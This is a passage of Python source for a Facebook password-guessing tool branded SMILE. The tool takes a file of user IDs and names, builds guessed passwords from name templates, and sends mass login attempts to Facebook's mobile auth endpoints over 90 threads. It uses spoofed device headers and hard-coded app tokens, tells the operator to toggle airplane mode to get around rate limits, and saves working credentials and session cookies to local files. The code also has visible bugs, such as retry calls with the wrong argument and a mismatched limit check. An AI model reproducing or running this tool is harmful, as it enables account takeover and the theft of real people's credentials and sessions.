        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='4':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='5':
        methods.append('methodE')
        main_crack().crack(id)
    elif option =='6':
        methods.append('methodF')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SMILE.txt');linex()
        os.system('espeak -a 300 " ENTER,   YOUR,   FILE,   NAME"')
        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            heron="[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.33."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/Astelit-LIFE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;FBRV/0;]"
            animasi = random.choice(["\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE","\x1b[1;97mSMILE","\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE"]) 
            sys.stdout.write(f"\r{A}[{animasi}-{X}M1{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G5}OK{A}/{R}CP{A}]{G}-{A}[{G5}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:       
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': useragent(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS-💚] {sid} | {ps} ")
                    os.system('espeak -a 300 " CONGRATULATIONS ,   OK,  ID"')
                    open('/sdcard/SMILE-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\r{M}[SMILE-CP] {sid} | {ps} ")
                     #os.system('espeak -a 300 " C,  P"')
                     open('/sdcard/SMILE-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            animasi = random.choice(["\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE","\x1b[1;97mSMILE","\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE"]) 
            sys.stdout.write(f"\r{A}[{animasi}-{X}M2{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G5}OK{A}/{R}CP{A}]{G}-{A}[{G5}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': amul(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS-💚] {sid} | {ps} ")
                    os.system('espeak -a 300 " CONGRATULATIONS,   OK,   ID"')
                    open('/sdcard/SMILE-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SMILE-CP] {sid} | {ps} ")
                    os.system('espeak -a 300 " C,   P"')
                    open('/sdcard/SMILE-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
#__________________[ FILE METHOD M3 ]__________________#           
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            noth=f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/263016076;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476343;FBDM/{density=1.9125,width=720,height=1410};FBLC/es_LA;FBRV/262705035;FBCR/Claro AR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e(6) plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            animasi = random.choice(["\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE","\x1b[1;97mSMILE","\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE"]) 
            sys.stdout.write(f"\r{A}[{animasi}-{X}M3{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G5}OK{A}/{R}CP{A}]{G}-{A}[{G5}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:       
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': noth,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS-💚] {sid} | {ps} ")
                    os.system('espeak -a 300 " CONGRATULATIONS ,   OK,  ID"')
                    open('/sdcard/SMILE-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\r{M}[SMILE-CP] {sid} | {ps} ")
                     #os.system('espeak -a 300 " C,  P"')
                     open('/sdcard/SMILE-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
           
#__________________[ FILE METHOD M4 ]__________________#             
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            ups=f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245036;FBDM/{density=3.75,width=1440,height=2780};FBLC/sv_SE;FBRV/266666038;FBCR/ Com Hem;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803863;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/271338440;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797384;FBDM/{density=2.0,width=720,height=1424};FBLC/th_Qaau_TH;FBRV/275412984;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            animasi = random.choice(["\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE","\x1b[1;97mSMILE","\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE"]) 
            sys.stdout.write(f"\r{A}[{animasi}-{X}M4{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G5}OK{A}/{R}CP{A}]{G}-{A}[{G5}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ups,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS-💚] {sid} | {ps} ")
                    os.system('espeak -a 300 " CONGRATULATIONS,   OK,   ID"')
                    open('/sdcard/SMILE-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SMILE-CP] {sid} | {ps} ")
                    os.system('espeak -a 300 " C,   P"')
                    open('/sdcard/SMILE-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
#__________________[ FILE METHOD M5 ]__________________#           
    def methodE(self, sid, name, psw):
        try:
            global oks,cps,loop
            max=f"Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.10."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]"+"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/280530471;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            animasi = random.choice(["\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE","\x1b[1;97mSMILE","\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE"]) 
            sys.stdout.write(f"\r{A}[{animasi}-{X}M5{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G5}OK{A}/{R}CP{A}]{G}-{A}[{G5}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:       
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': max,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS-💚] {sid} | {ps} ")
                    os.system('espeak -a 300 " CONGRATULATIONS ,   OK,  ID"')
                    open('/sdcard/SMILE-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\r{M}[SMILE-CP] {sid} | {ps} ")
                     #os.system('espeak -a 300 " C,  P"')
                     open('/sdcard/SMILE-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
#__________________[ FILE METHOD M6 ]__________________#             
    def methodF(self, sid, name, psw):
        try:
            global oks,cps,loop
            sex=f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            animasi = random.choice(["\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE","\x1b[1;97mSMILE","\x1b[1;91mSMILE","\x1b[1;92mSMILE","\x1b[1;93mSMILE","\x1b[1;94mSMILE","\x1b[1;95mSMILE","\x1b[1;96mSMILE"]) 
            sys.stdout.write(f"\r{A}[{animasi}-{X}M6{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G5}OK{A}/{R}CP{A}]{G}-{A}[{G5}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': sex,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS-💚] {sid} | {ps} ")
                    os.system('espeak -a 300 " CONGRATULATIONS,   OK,   ID"')
                    open('/sdcard/SMILE-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SMILE-CP] {sid} | {ps} ")
                    os.system('espeak -a 300 " C,   P"')
                    open('/sdcard/SMILE-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
            clear()
            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
            clear()
            print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
            print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
            linex()
            with Habib(max_workers=90) as AJworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                AJworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                AJworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                AJworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                AJworld.submit(self.methodD, uid, name, pwx)
                            elif 'methodE' in methods:
                                AJworld.submit(self.methodE, uid, name, pwx)
                            elif 'methodF' in methods:
                                AJworld.submit(self.methodF, uid, name, pwx)
                   except:pass
            result(oks,cps)
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
